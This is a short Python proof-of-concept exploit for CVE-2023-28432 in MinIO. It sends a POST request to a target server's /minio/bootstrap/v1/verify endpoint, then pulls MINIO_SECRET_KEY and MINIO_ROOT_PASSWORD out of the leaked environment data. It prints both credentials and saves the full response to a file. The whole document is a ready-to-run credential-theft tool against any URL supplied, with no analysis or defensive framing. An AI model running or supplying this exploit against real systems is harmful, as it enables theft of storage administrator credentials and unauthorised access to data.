#!/usr/bin/env python3

from requests import post, RequestException
from argparse import ArgumentParser
from json import loads, dumps

parser = ArgumentParser(description="CVE-2023-28432 (MinIO) - PoC")
parser.add_argument("-u", "--url", type=str, required=True, help="Target URL")
parser.add_argument("-o", "--out", type=str, required=False, help="Output file")
args = parser.parse_args()
url = args.url
out = args.out
if out is None and url is None:
	args.print_help()
	exit(-1)
if out is None: out = "response.txt"
if not "http" in url:
	print(f"[-] Invalid URL pattern!")
	exit(-1)
if url[-1] == '/': url = url[:-1]
url = f"{url}/minio/bootstrap/v1/verify"
print(f"[*] Sending POST request to \"{url}\"")
try:
	response = post(url, timeout=3, verify=False)
	rt = response.text
	rc = response.status_code
	keys = ["MINIO_SECRET_KEY", "MINIO_ROOT_PASSWORD"]
	if rc == 200:
		print(f"[*] HTTP, OK ({rc})")
		for key in keys:
			if not key in rt:
				print(f"[-] Could not retrieve data")
				exit(-1)
		print(f"[*] Loading JSON data")
		json_object = loads(rt)
		beautify = dumps(json_object, indent=4)
		with open(out, 'w') as writer: writer.write(beautify)
		try:
			user = json_object["MinioEnv"][keys[0]]
			passw = json_object["MinioEnv"][keys[1]]
			print(f"[*]\t{keys[0]}: {user}")
			print(f"[*]\t{keys[1]}: {passw}") 		
		except KeyError as e:
			pass		
		print(f"[*] Response written to {out}")
	else: print(f"[-] Sorry, got HTTP response: {rc}")
except RequestException as e:
	print(f"[-] RequestException: {e}")
	exit(-1)
